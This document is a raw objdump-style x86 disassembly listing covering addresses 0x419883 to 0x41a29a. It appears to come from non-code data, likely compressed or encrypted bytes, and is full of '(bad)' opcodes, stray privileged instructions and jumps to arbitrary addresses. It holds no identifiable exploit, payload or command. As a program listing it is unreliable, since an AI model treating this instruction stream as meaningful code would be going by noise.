  419883:	stos   DWORD PTR es:[edi],eax
  419884:	jecxz  0x4198a0
  419886:	mov    ds:0xab762307,eax
  41988b:	in     al,dx
  41988c:	fisubr DWORD PTR [edx+0x4f01b7]
	...
  4198f2:	add    BYTE PTR [eax],al
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fisttp QWORD PTR [edx+0x8b0ee57]
  419905:	sgdtd  [eax]
  419908:	add    eax,0xa7000001
  41990d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41990e:	(bad)  
  41990f:	lods   al,BYTE PTR ds:[esi]
  419910:	dec    eax
  419911:	xchg   edi,eax
  419912:	lahf   
  419913:	and    eax,0x11437661
  419918:	aas    
  419919:	mov    edx,DWORD PTR [ebp+0x405e96fb]
  41991f:	ret    0x3dad
  419922:	mov    bl,0x98
  419924:	mov    cl,0x24
  419926:	xchg   ebx,eax
  419927:	lods   al,BYTE PTR ds:[esi]
  419928:	xor    BYTE PTR [edi-0x41f27b4b],dh
  41992e:	push   ebx
  41992f:	cmp    al,0x96
  419931:	cmp    BYTE PTR [esi],bh
  419933:	pop    eax
  419934:	mov    al,0xcb
  419936:	sbb    BYTE PTR es:[ecx-0xa],0x0
  41993b:	xor    ah,BYTE PTR [ebx+0x5b754840]
  419941:	sbb    bh,BYTE PTR [ebp-0x41]
  419944:	scas   al,BYTE PTR es:[edi]
  419945:	loop   0x4198cc
  419947:	xchg   ah,bh
  419949:	fnstsw WORD PTR [ecx]
  41994b:	add    BYTE PTR [ecx],dh
  41994d:	outs   dx,BYTE PTR ds:[esi]
  41994e:	(bad)  
  41994f:	loop   0x41995c
  419951:	dec    ebx
  419952:	pop    es
  419953:	(bad)  
  419954:	or     bl,dl
  419956:	pop    ss
  419957:	jl     0x41999f
  419959:	js     0x419928
  41995b:	(bad)  
  41995c:	hlt    
  41995d:	ja     0x41992a
  41995f:	mov    dh,0x16
  419961:	cdq    
  419962:	and    edx,DWORD PTR [ebp-0x45]
  419965:	pop    ebx
  419966:	mov    eax,0x647333a9
  41996b:	sbb    al,0xde
  41996d:	fcomp  DWORD PTR [ecx]
  41996f:	sub    BYTE PTR [ecx-0x55a56a1d],0x9c
  419976:	jnp    0x419991
  419978:	xor    eax,0xb8815118
  41997d:	adc    al,0xba
  41997f:	nop
  419980:	rol    BYTE PTR [esi+0x1a],0x48
  419984:	dec    esp
  419985:	call   0xcfd6ff24
  41998a:	inc    ecx
  41998b:	aam    0x1b
  41998d:	mov    ebp,DWORD PTR [ebp+0x71]
  419990:	fisub  DWORD PTR [edi+0x59]
  419993:	sub    eax,0x3ffdd733
  419998:	cdq    
  419999:	push   ecx
  41999a:	icebp  
  41999b:	ins    BYTE PTR es:[edi],dx
  41999c:	ret    
  41999d:	mov    cl,0x55
  41999f:	in     al,0x83
  4199a1:	aad    0x16
  4199a3:	out    dx,eax
  4199a4:	jg     0x4199b2
  4199a6:	xchg   edx,eax
  4199a7:	pop    ebx
  4199a8:	xchg   BYTE PTR [eax+0xc],ch
  4199ab:	push   eax
  4199ac:	lods   eax,DWORD PTR ds:[esi]
  4199ad:	mov    ebx,0xf6ac6c7d
  4199b2:	nop
  4199b3:	mov    cl,0xae
  4199b5:	sbb    eax,0x703c399d
  4199ba:	push   esi
  4199bb:	cmp    ecx,DWORD PTR [eax-0x51]
  4199be:	inc    edx
  4199bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c0:	in     eax,0x34
  4199c2:	mov    esi,0x757bbbb3
  4199c7:	xchg   ebx,eax
  4199c8:	mov    eax,ds:0xda161306
  4199cd:	icebp  
  4199ce:	add    DWORD PTR [edx+ecx*4+0x44cd56eb],esp
  4199d5:	push   cs
  4199d6:	pop    ebp
  4199d7:	je     0x41998b
  4199d9:	aaa    
  4199da:	ss jbe 0x419a17
  4199dd:	cmc    
  4199de:	add    eax,0xfd8635ea
  4199e3:	sbb    DWORD PTR [edx+0x8dd6fa],edi
  4199e9:	lock or eax,0xbd9ca130
  4199ef:	addr16 mov cl,0x1c
  4199f2:	mov    bh,0xb5
  4199f4:	and    DWORD PTR [edi],0x1c
  4199f7:	or     BYTE PTR [edi],0x23
  4199fa:	sbb    DWORD PTR [ecx],edx
  4199fc:	pop    edi
  4199fd:	(bad)  
  4199fe:	iret   
  4199ff:	clc    
  419a00:	jb     0x419a27
  419a02:	(bad)  
  419a03:	xor    BYTE PTR [ebp-0x3c],cl
  419a06:	sub    dh,BYTE PTR [eax+0x2d80d216]
  419a0c:	add    DWORD PTR [edx+ebp*2+0x88b8],esp
	...
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x41c215d3
  419a81:	mov    ch,0xdc
  419a83:	push   esi
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    BYTE PTR [esi],dh
  419a8d:	int    0xdf
  419a8f:	neg    BYTE PTR [ebx]
  419a91:	shl    edx,cl
  419a93:	test   BYTE PTR [edx-0x47],bh
  419a96:	xor    eax,DWORD PTR [edi-0x74]
  419a99:	je     0x419af3
  419a9b:	test   al,0x16
  419a9d:	cs dec eax
  419a9f:	sbb    BYTE PTR [esp+edx*4-0x60],ah
  419aa3:	ins    DWORD PTR es:[edi],dx
  419aa4:	dec    esi
  419aa5:	xor    DWORD PTR [esi-0x3568b8b9],edx
  419aab:	lahf   
  419aac:	fmul   st,st(6)
  419aae:	push   0xc74c1e49
  419ab3:	pop    ebp
  419ab4:	mov    al,ds:0x7944eac6
  419ab9:	out    dx,al
  419aba:	(bad)  
  419abb:	stos   DWORD PTR es:[edi],eax
  419abc:	inc    edi
  419abd:	push   ss
  419abe:	cmp    eax,0x6c5f90ba
  419ac3:	and    dh,BYTE PTR [ebx+0x65571f4]
  419ac9:	or     cl,BYTE PTR [edi]
  419acb:	adc    eax,DWORD PTR [esi+edi*1+0x6d136839]
  419ad2:	loopne 0x419b0f
  419ad4:	cmp    ebp,DWORD PTR [eax]
  419ad6:	lahf   
  419ad7:	cwde   
  419ad8:	add    dh,0x90
  419adb:	dec    ebx
  419adc:	push   esi
  419add:	mov    al,0xb
  419adf:	adc    BYTE PTR [edi-0x71],ch
  419ae2:	pop    es
  419ae3:	dec    eax
  419ae4:	out    0x4a,al
  419ae6:	nop
  419ae7:	sbb    dl,ah
  419ae9:	dec    esi
  419aea:	int3   
  419aeb:	iret   
  419aec:	or     bh,BYTE PTR [ecx]
  419aee:	mov    BYTE PTR [edi-0x115b92dd],0xaf
  419af5:	xchg   ebx,eax
  419af6:	iret   
  419af7:	in     eax,dx
  419af8:	lods   al,BYTE PTR ds:[esi]
  419af9:	addr16 iret 
  419afb:	loope  0x419abb
  419afd:	pop    esp
  419afe:	aam    0xc
  419b00:	sub    DWORD PTR ds:[ecx],edi
  419b03:	inc    ecx
  419b04:	fst    QWORD PTR [esp+ebp*4]
  419b07:	xor    eax,0xd8979582
  419b0c:	jmp    0x45b1feab
  419b11:	jl     0x419b09
  419b13:	adc    al,0x1d
  419b15:	dec    edx
  419b16:	cmp    ebp,ebp
  419b18:	pop    esp
  419b19:	xor    bl,BYTE PTR [esi]
  419b1b:	add    esi,ebp
  419b1d:	sbb    ch,BYTE PTR [edx-0x265c838]
  419b23:	inc    eax
  419b24:	cmp    eax,0x8be4449f
  419b29:	sub    al,0xb9
  419b2b:	int    0x4d
  419b2d:	sbb    BYTE PTR [edi],bl
  419b2f:	mov    esp,0xbf127099
  419b34:	jp     0x419b9d
  419b36:	inc    edi
  419b37:	cmc    
  419b38:	dec    ebp
  419b39:	into   
  419b3a:	arpl   WORD PTR [ecx-0x27],ax
  419b3d:	dec    eax
  419b3e:	xchg   BYTE PTR [eax+0x6f],dh
  419b41:	mov    ah,0xde
  419b43:	loope  0x419b4d
  419b45:	inc    esi
  419b46:	xchg   ebx,eax
  419b47:	bound  edi,QWORD PTR [esi+0x11]
  419b4a:	arpl   WORD PTR [ecx-0x4957716],dx
  419b50:	outs   dx,BYTE PTR ds:[esi]
  419b51:	lahf   
  419b52:	(bad)  
  419b53:	mov    BYTE PTR [ebx],bh
  419b55:	xchg   ecx,eax
  419b56:	daa    
  419b57:	int3   
  419b58:	outs   dx,BYTE PTR ds:[esi]
  419b59:	xchg   edx,eax
  419b5a:	or     eax,0x5869427a
  419b5f:	ret    
  419b60:	call   0xa57623b2
  419b65:	fldenv [ecx+ebx*4-0x74]
  419b69:	push   esp
  419b6a:	pop    ss
  419b6b:	scas   eax,DWORD PTR es:[edi]
  419b6c:	add    ecx,DWORD PTR [edx+0x45]
  419b6f:	push   0x1ae1f262
  419b74:	or     DWORD PTR [ebx-0x4d],edi
  419b77:	fwait
  419b78:	mov    ds:0xdbf56626,eax
  419b7d:	inc    esi
  419b7e:	sub    BYTE PTR [esi],dl
  419b80:	shr    BYTE PTR [ebx+ebx*4-0x3c],1
  419b84:	fwait
  419b85:	add    al,0x77
  419b87:	or     bl,BYTE PTR [edi-0x3e5a9dfc]
  419b8d:	inc    eax
  419b8e:	stc    
  419b8f:	stos   BYTE PTR es:[edi],al
  419b90:	cmp    DWORD PTR [eax],eax
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x69
  419c01:	xchg   DWORD PTR [edi+edx*8],esp
  419c04:	adc    dl,BYTE PTR [ecx]
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0x2d000001
  419c0d:	rcl    BYTE PTR [edx],cl
  419c0f:	dec    ecx
  419c10:	(bad)  [ebx-0x20c3217]
  419c16:	test   eax,0xb630339c
  419c1b:	inc    eax
  419c1c:	dec    esi
  419c1d:	mov    WORD PTR [esi+0x3d],ds
  419c20:	add    al,0x24
  419c22:	mov    esp,0xba7b4e36
  419c27:	ret    0xaec7
  419c2a:	jb     0x419c1d
  419c2c:	mov    ah,0x17
  419c2e:	jnp    0x419c9a
  419c30:	daa    
  419c31:	pop    ds
  419c32:	push   es
  419c33:	add    al,0xca
  419c35:	ja     0x419c8b
  419c37:	jo     0x419bdb
  419c39:	sub    al,0x30
  419c3b:	pop    edx
  419c3c:	cli    
  419c3d:	leave  
  419c3e:	xchg   ah,cl
  419c40:	pop    edi
  419c41:	adc    al,0xe2
  419c43:	enter  0x318a,0xc8
  419c47:	sar    DWORD PTR [esi],1
  419c49:	mov    DWORD PTR [edi-0x1f],ebp
  419c4c:	cmp    esi,DWORD PTR [esp+esi*1+0x49]
  419c50:	jno    0x419c83
  419c52:	cli    
  419c53:	mov    edx,0xafcc73ad
  419c58:	data16 int3 
  419c5a:	stc    
  419c5b:	mov    bh,0xbb
  419c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c5e:	jge    0x419c1a
  419c60:	jl     0x419c78
  419c62:	dec    ecx
  419c63:	push   0xb90ba49
  419c68:	and    esi,ebx
  419c6a:	stos   BYTE PTR es:[edi],al
  419c6b:	(bad)  
  419c6c:	in     al,0x73
  419c6e:	in     al,0xd9
  419c70:	mov    ah,0xe0
  419c72:	outs   dx,DWORD PTR ds:[esi]
  419c73:	mov    esi,0xe4cbfd95
  419c78:	xchg   edi,eax
  419c79:	mov    bl,0xb4
  419c7b:	add    eax,0x988c225a
  419c80:	mov    ds:0xa480db75,al
  419c85:	repz dec ebp
  419c87:	retf   0x9b61
  419c8a:	push   ds
  419c8b:	inc    ebx
  419c8c:	inc    BYTE PTR [edi-0x39]
  419c8f:	push   ss
  419c90:	sub    eax,0xd40a45bc
  419c95:	mov    ebp,0x500d1df2
  419c9a:	adc    al,0xf1
  419c9c:	adc    al,0x35
  419c9e:	test   WORD PTR [ecx+edi*2],ax
  419ca2:	or     eax,0x1794c132
  419ca7:	xchg   DWORD PTR [eax+0x75],ecx
  419caa:	mov    edx,0x5141c525
  419caf:	xor    eax,0x66894975
  419cb4:	xchg   ebp,eax
  419cb5:	cmp    bh,dl
  419cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cb8:	sub    al,0xa6
  419cba:	aaa    
  419cbb:	test   edx,esp
  419cbd:	pushf  
  419cbe:	xchg   edi,eax
  419cbf:	pop    edx
  419cc0:	das    
  419cc1:	call   0xc802:0xfaa0b595
  419cc8:	pminsw mm5,mm6
  419ccb:	xchg   BYTE PTR [ebx*1+0x7ebd008d],al
  419cd2:	xchg   DWORD PTR [edi-0x1f973955],ebx
  419cd8:	ficom  WORD PTR [eax-0x73]
  419cdb:	lods   al,BYTE PTR ds:[esi]
  419cdc:	push   ebx
  419cdd:	fxch   st(0)
  419cdf:	popa   
  419ce0:	iret   
  419ce1:	sub    DWORD PTR [edi],esi
  419ce3:	mov    eax,ds:0x5bfd9350
  419ce8:	hlt    
  419ce9:	iret   
  419cea:	and    edi,ebp
  419cec:	mov    cl,bh
  419cee:	mov    dh,0x6d
  419cf0:	sub    DWORD PTR [esi-0x1b],edi
  419cf3:	inc    edi
  419cf4:	adc    al,0x29
  419cf6:	mov    bh,0xf4
  419cf8:	fchs   
  419cfa:	les    esp,FWORD PTR [eax+0x2d]
  419cfd:	sbb    eax,edx
  419cff:	test   eax,0xf58ab585
  419d04:	xchg   ebp,eax
  419d05:	or     eax,0x28f9e633
  419d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d0b:	xlat   BYTE PTR ds:[ebx]
  419d0c:	das    
  419d0d:	mov    bh,0xd1
  419d0f:	hlt    
  419d10:	rol    BYTE PTR [eax],0x0
	...
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fisubr DWORD PTR ss:[eax-0x3c]
  419d82:	xchg   ebp,eax
  419d83:	and    DWORD PTR [edi],edx
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0xd5000001,al
  419d8d:	(bad)  
  419d8e:	mov    ?,esi
  419d90:	push   esi
  419d91:	fsub   DWORD PTR [eax]
  419d93:	xor    ebp,esp
  419d95:	inc    ax
  419d97:	push   0xfffffff4
  419d99:	imul   esp,DWORD PTR [edx-0x3aa22ff4],0x8dab47e9
  419da3:	mov    esp,0xf656fbe2
  419da8:	outs   dx,DWORD PTR ds:[esi]
  419da9:	jmp    0x419d86
  419dab:	jmp    0x419d44
  419dad:	repz daa 
  419daf:	call   0x25186828
  419db4:	inc    ebx
  419db5:	test   DWORD PTR [esp+esi*4+0x59bf600],ecx
  419dbc:	shl    DWORD PTR [edx],1
  419dbe:	add    BYTE PTR [esi+0x4],cl
  419dc1:	cs or  eax,0x4ce3981b
  419dc7:	repnz lods al,BYTE PTR ds:[esi]
  419dc9:	js     0x419d62
  419dcb:	push   edx
  419dcc:	pop    ss
  419dcd:	xchg   edi,eax
  419dce:	loopne 0x419dc3
  419dd0:	jge    0x419e39
  419dd2:	data16 cs jl 0x419dfc
  419dd6:	dec    esi
  419dd7:	xor    BYTE PTR [eax-0x14],bh
  419dda:	add    BYTE PTR [ebx+eiz*2],ah
  419ddd:	neg    bh
  419ddf:	jbe    0x419d96
  419de1:	xchg   ebp,eax
  419de2:	outs   dx,BYTE PTR ds:[esi]
  419de3:	xor    ebx,0x7e7732b0
  419de9:	lods   al,BYTE PTR ds:[esi]
  419dea:	retf   0xb724
  419ded:	fidiv  WORD PTR [eax]
  419def:	add    esi,DWORD PTR [eax]
  419df1:	pusha  
  419df2:	(bad)  
  419df3:	jmp    0x97effc04
  419df8:	mov    BYTE PTR [ebp+0x79],ah
  419dfb:	jmp    0x6146:0xa5bd9613
  419e02:	mov    ds,WORD PTR [edx-0x1e]
  419e05:	fwait
  419e06:	arpl   WORD PTR [ecx],sp
  419e08:	cmp    esi,ecx
  419e0a:	xor    eax,0xa8a0967b
  419e0f:	add    esi,DWORD PTR [edx]
  419e11:	pop    ds
  419e12:	cmp    DWORD PTR [ebp+0x16],ebx
  419e15:	fist   DWORD PTR [esi-0x38]
  419e18:	sub    al,0x18
  419e1a:	and    bh,BYTE PTR [ebp-0x5719e945]
  419e20:	xor    DWORD PTR [eax-0x30],esi
  419e23:	add    DWORD PTR ds:0xba481f38,ecx
  419e29:	push   esi
  419e2a:	and    BYTE PTR ds:0xbbeb3bc2,bl
  419e30:	sub    eax,0x74432ea1
  419e35:	test   al,0xcc
  419e37:	(bad)  
  419e38:	cmp    edx,DWORD PTR [esi-0x21e1ad39]
  419e3e:	and    ebp,ebp
  419e40:	push   es
  419e41:	scas   eax,DWORD PTR es:[edi]
  419e42:	mov    al,ds:0x66795280
  419e47:	(bad)  
  419e48:	xor    eax,0x5056468
  419e4d:	push   ebx
  419e4e:	sub    DWORD PTR [ecx],ecx
  419e50:	fwait
  419e51:	and    al,0xa2
  419e53:	dec    edi
  419e54:	add    BYTE PTR [ebx-0x1bc8de6a],al
  419e5a:	into   
  419e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e5c:	cmp    esi,esp
  419e5e:	popa   
  419e5f:	adc    ebx,edx
  419e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e62:	xlat   BYTE PTR ds:[ebx]
  419e63:	mov    cl,0xa4
  419e65:	xchg   edx,eax
  419e66:	cwde   
  419e67:	pop    edi
  419e68:	fisubr WORD PTR [eax-0x61]
  419e6b:	inc    ebp
  419e6c:	jno    0x419e02
  419e6e:	add    BYTE PTR [ecx-0x2e],0x3b
  419e72:	mov    edx,0xd2f5e495
  419e77:	add    eax,0xac499e99
  419e7c:	xor    al,0x29
  419e7e:	push   ecx
  419e7f:	pop    edx
  419e80:	pop    ds
  419e81:	push   cs
  419e82:	das    
  419e83:	jecxz  0x419ef6
  419e85:	loop   0x419ee1
  419e87:	and    esi,edi
  419e89:	retf   
  419e8a:	xchg   esp,eax
  419e8b:	aaa    
  419e8c:	pop    edi
  419e8d:	xor    ecx,0x0
  419e90:	sub    BYTE PTR [eax],al
	...
  419ef2:	add    BYTE PTR [eax],al
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	dec    eax
  419f01:	inc    esi
  419f02:	fmul   st(4),st
  419f04:	sbb    al,0x13
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0xb6000001
  419f0d:	enter  0xdf6c,0x47
  419f11:	or     BYTE PTR [ebx+0x8],0xf3
  419f15:	imul   edx,esp,0xeaee9365
  419f1b:	dec    ecx
  419f1c:	or     ah,dh
  419f1e:	dec    ecx
  419f1f:	xor    ebx,ecx
  419f21:	mov    esi,0x5e81cfa7
  419f26:	jb     0x419f93
  419f28:	ja     0x419f96
  419f2a:	in     eax,0x82
  419f2c:	(bad)  
  419f2d:	xor    eax,0xfa31b257
  419f32:	repnz add al,0x7f
  419f35:	jo     0x419fb3
  419f37:	adc    BYTE PTR [edx+0x1ec0ed78],al
  419f3d:	sahf   
  419f3e:	cmp    DWORD PTR [edx],ebp
  419f40:	sar    bl,cl
  419f42:	leave  
  419f43:	out    0x9d,al
  419f45:	jecxz  0x419fb9
  419f47:	cmp    eax,0xb4cde48
  419f4c:	jmp    0x419f8a
  419f4e:	clc    
  419f4f:	daa    
  419f50:	fnsave [ecx+ebx*2]
  419f53:	inc    ecx
  419f54:	add    DWORD PTR [ebp-0x3546ec7c],edx
  419f5a:	repz dec eax
  419f5c:	mov    esp,0x77040029
  419f61:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419f63:	out    dx,eax
  419f64:	xchg   edi,eax
  419f65:	mov    edx,cr7
  419f68:	add    al,BYTE PTR [ebx+0x45]
  419f6b:	loopne 0x419feb
  419f6d:	mov    edi,0xa9bb3334
  419f72:	adc    esi,ebx
  419f74:	xchg   ecx,eax
  419f75:	adc    esi,edx
  419f77:	push   0x21
  419f79:	retf   
  419f7a:	bound  ebp,QWORD PTR [eax-0x2a]
  419f7d:	dec    eax
  419f7e:	mov    BYTE PTR [edi+eiz*8],ch
  419f81:	and    DWORD PTR [ebp-0x4a],ecx
  419f84:	cmp    al,0x9f
  419f86:	mov    ds:0x9048a0b4,al
  419f8b:	sar    ebp,cl
  419f8d:	inc    esi
  419f8e:	into   
  419f8f:	push   DWORD PTR [esi+ebx*4]
  419f92:	ficom  DWORD PTR [eax+0xa]
  419f95:	jne    0x419fea
  419f97:	push   ebp
  419f98:	xchg   edi,eax
  419f99:	mov    ebx,0xaee5d23
  419f9e:	inc    edx
  419f9f:	cmp    dl,cl
  419fa1:	and    BYTE PTR [edi+0x4a],cl
  419fa4:	int    0x1f
  419fa6:	lock popf 
  419fa8:	repnz btr edx,edx
  419fac:	inc    edx
  419fad:	test   al,0x4b
  419faf:	pop    ss
  419fb0:	fcmovu st,st(1)
  419fb2:	aad    0xdc
  419fb4:	sbb    eax,0x15aaecbc
  419fb9:	out    0x46,al
  419fbb:	lea    eax,[eax-0x24]
  419fbe:	mov    ebp,0xf39dfe4a
  419fc3:	jecxz  0x419fb9
  419fc5:	ss cli 
  419fc7:	xor    eax,0x40a0fc8c
  419fcc:	or     eax,0x98fb5bad
  419fd1:	xchg   ebx,eax
  419fd2:	jo     0x419fff
  419fd4:	push   es
  419fd5:	xlat   BYTE PTR ds:[ebx]
  419fd6:	mov    dh,0x9c
  419fd8:	xor    al,0xbd
  419fda:	call   0x709a:0x644e2b8d
  419fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fe2:	xchg   esp,ebp
  419fe4:	sub    BYTE PTR [ebx+edi*2],0x10
  419fe8:	push   esi
  419fe9:	cmp    ebp,DWORD PTR [ebp+ebp*4+0x1f]
  419fed:	dec    ecx
  419fee:	push   ecx
  419fef:	sub    al,0x25
  419ff1:	les    edx,FWORD PTR [eax-0x4]
  419ff4:	xchg   DWORD PTR [eax+0x46],edi
  419ff7:	jmp    0x41a5aa12
  419ffc:	xor    ecx,ebx
  419ffe:	fwait
  419fff:	ret    0x7905
  41a002:	cdq    
  41a003:	push   ecx
  41a004:	add    eax,0x376c27dc
  41a009:	cmp    DWORD PTR [edi+0x23d45788],esp
  41a00f:	out    0x3a,eax
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x34],bh
  41a081:	rol    DWORD PTR [ebx+0x32],1
  41a084:	and    DWORD PTR [ecx+eax*1],edx
  41a087:	add    BYTE PTR ds:0x2a000001,al
  41a08d:	mov    bl,0x8a
  41a08f:	adc    BYTE PTR [edx+0x4d],bl
  41a092:	dec    DWORD PTR ds:0x2cee9578
  41a098:	mov    ecx,DWORD PTR ds:[ebx-0x50]
  41a09c:	lods   eax,DWORD PTR ds:[esi]
  41a09d:	fdiv   st(4),st
  41a09f:	retf   
  41a0a0:	(bad)  
  41a0a1:	outs   dx,BYTE PTR ds:[esi]
  41a0a2:	(bad)
  41a0a5:	and    edx,ebp
  41a0a7:	add    ch,BYTE PTR [ecx+0x63]
  41a0aa:	pushf  
  41a0ab:	xor    dh,BYTE PTR [edx-0x6f9e5529]
  41a0b1:	daa    
  41a0b2:	adc    esp,ebx
  41a0b4:	(bad)
  41a0b8:	into   
  41a0b9:	adc    eax,0x38e1558e
  41a0be:	sub    DWORD PTR [ebp-0x74],ecx
  41a0c1:	xchg   edi,eax
  41a0c2:	in     eax,0xd7
  41a0c4:	xchg   ecx,edx
  41a0c6:	ret    
  41a0c7:	sub    bl,ah
  41a0c9:	inc    esp
  41a0ca:	mov    esp,0x1da6f639
  41a0cf:	dec    ecx
  41a0d0:	push   eax
  41a0d1:	pop    ebx
  41a0d2:	je     0x41a085
  41a0d4:	rcl    BYTE PTR [ebp-0x65],1
  41a0d7:	xor    eax,0xaf423817
  41a0dc:	jle    0x41a0f0
  41a0de:	retf   
  41a0df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0e0:	test   esi,ebx
  41a0e2:	std    
  41a0e3:	push   ebx
  41a0e4:	inc    esi
  41a0e5:	or     edi,esi
  41a0e7:	push   ebx
  41a0e8:	lods   al,BYTE PTR ds:[esi]
  41a0e9:	pop    edx
  41a0ea:	imul   esi,edi,0xe668176a
  41a0f0:	nop    edi
  41a0f3:	mov    ebp,0x1f097439
  41a0f8:	sbb    eax,0x7fba1e89
  41a0fd:	cmp    DWORD PTR [ecx],ebx
  41a0ff:	arpl   WORD PTR [esi],cx
  41a101:	lods   al,BYTE PTR ds:[esi]
  41a102:	pop    ebx
  41a103:	and    WORD PTR [eax+0x23],si
  41a107:	aaa    
  41a108:	mov    edi,DWORD PTR [edi+0x67]
  41a10b:	mov    al,0x54
  41a10d:	jns    0x41a156
  41a10f:	leave  
  41a110:	mov    ?,WORD PTR [edi+0x23]
  41a113:	(bad)  
  41a114:	fnstenv [eax+0x55deb7cb]
  41a11a:	xor    BYTE PTR [edx+0x2f],dl
  41a11d:	and    dh,ch
  41a11f:	or     eax,0x4adcc62f
  41a124:	mov    WORD PTR ds:0x6c42946f,es
  41a12a:	and    esp,edx
  41a12c:	rol    bl,cl
  41a12e:	xor    al,0x7f
  41a130:	das    
  41a131:	cmp    DWORD PTR [ebp-0x27],eax
  41a134:	loopne 0x41a182
  41a136:	stc    
  41a137:	inc    ebx
  41a138:	call   0x9fcdc3fe
  41a13d:	icebp  
  41a13e:	test   al,0x9f
  41a140:	cmp    BYTE PTR [edi-0x39],0x42
  41a144:	scas   eax,DWORD PTR es:[edi]
  41a145:	sub    BYTE PTR [ecx+0x6b5bfd63],0x6f
  41a14c:	and    BYTE PTR [edx+0x3711a598],ch
  41a152:	nop
  41a153:	jbe    0x41a1a7
  41a155:	sbb    BYTE PTR [eax+0x7e3bd95c],bl
  41a15b:	mov    BYTE PTR [ecx],ch
  41a15d:	xchg   ecx,eax
  41a15e:	call   0x303b:0x647d5117
  41a165:	mov    cl,0xc7
  41a167:	xor    ebp,eax
  41a169:	fcos   
  41a16b:	mov    WORD PTR ds:0x1f62450c,?
  41a171:	cld    
  41a172:	and    eax,0xbffc15f3
  41a177:	inc    edx
  41a178:	les    ebx,FWORD PTR [ebp+0x290bf1fb]
  41a17e:	dec    esi
  41a17f:	mov    eax,ds:0x5df913ea
  41a184:	(bad)  
  41a185:	jmp    0xf909:0x5a82e149
  41a18c:	push   eax
  41a18d:	fs clc 
  41a18f:	add    ecx,edx
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	js     0x41a241
  41a202:	dec    ecx
  41a203:	xchg   DWORD PTR [esi],esp
  41a205:	adc    eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	mov    al,ch
  41a20e:	iret   
  41a20f:	mov    al,ds:0xdc3d9b6b
  41a214:	add    bh,dh
  41a216:	mov    al,0x94
  41a218:	push   0x36
  41a21a:	jge    0x41a227
  41a21c:	popf   
  41a21d:	push   ds
  41a21e:	lods   al,BYTE PTR ds:[esi]
  41a21f:	push   ds
  41a220:	stos   DWORD PTR es:[edi],eax
  41a221:	and    ecx,DWORD PTR [esi]
  41a223:	sbb    al,0xb4
  41a225:	mov    bh,0xd1
  41a227:	xchg   ebp,eax
  41a228:	sbb    BYTE PTR [eax+0x30d053a2],bh
  41a22e:	mov    ebp,ss
  41a230:	iret   
  41a231:	jo     0x41a1da
  41a233:	in     al,dx
  41a234:	push   ebx
  41a235:	hlt    
  41a236:	jecxz  0x41a2ad
  41a238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a239:	test   DWORD PTR [edx+0xb346631],ebp
  41a23f:	jo     0x41a2b3
  41a241:	jbe    0x41a1ec
  41a243:	xchg   edi,eax
  41a244:	add    eax,0xc3c824c5
  41a249:	imul   edi,DWORD PTR [eax],0x98b4c61d
  41a24f:	push   ss
  41a250:	enter  0x7456,0x4e
  41a254:	sub    BYTE PTR [ebp+0x3f],cl
  41a257:	dec    eax
  41a258:	cwde   
  41a259:	cs inc ebp
  41a25b:	adc    al,0x90
  41a25d:	das    
  41a25e:	scas   al,BYTE PTR es:[edi]
  41a25f:	mov    esp,0xdc3ddadd
  41a264:	pop    ss
  41a265:	std    
  41a266:	not    BYTE PTR [eax+0x623ffbf7]
  41a26c:	lahf   
  41a26d:	xchg   edx,eax
  41a26e:	int    0xdd
  41a270:	popa   
  41a271:	jmp    0x81db3acc
  41a276:	xchg   DWORD PTR ds:0x46d4a9e7,edx
  41a27c:	and    esp,DWORD PTR [edi+0x76]
  41a27f:	mov    edx,0xc75b4d70
  41a284:	xchg   esp,eax
  41a285:	cmp    edx,ecx
  41a287:	sahf   
  41a288:	push   0xfffffff2
  41a28a:	lahf   
  41a28b:	and    eax,0x6ed4e6c6
  41a290:	xlat   BYTE PTR ds:[ebx]
  41a291:	jne    0x41a30d
  41a293:	div    edx
  41a295:	mov    eax,ds:0x6a12a55f
  41a29a:	xchg   ebx,eax
